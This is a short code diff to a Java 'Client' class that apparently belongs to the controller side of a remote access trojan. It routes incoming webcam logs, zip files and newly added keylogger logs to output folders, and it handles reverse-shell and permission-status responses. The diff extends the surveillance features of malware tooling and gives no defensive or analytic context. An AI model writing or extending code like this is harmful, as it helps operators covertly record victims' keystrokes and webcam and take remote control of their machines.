@@ -51,7 +51,7 @@ public class Client {
 
     public void handleFileCompletion(BytesChannel bytesChannel, byte[] finalData) {
         switch (bytesChannel.getCategory()) {
-            case ZIP_FILE, WEBCAM_LOGS -> {
+            case ZIP_FILE, WEBCAM_LOGS, KEYLOGGER_LOGS -> {
                 writeFile(finalData, bytesChannel.getCategoryOutputFolder());
                 closeFileChannel(bytesChannel.getId());
             }
@@ -88,6 +88,7 @@ public class Client {
         mapOfResponses.put(Response.SCREEN_DIMENSIONS, updater::setScreenDimensions);
         mapOfResponses.put(Response.MONITORS, updater::updateMonitors);
         mapOfResponses.put(Response.SHELL, updater::updateReverseShell);
+        mapOfResponses.put(Response.PERMISSIONS, updater::showPermissionStatus);
     }
 
 
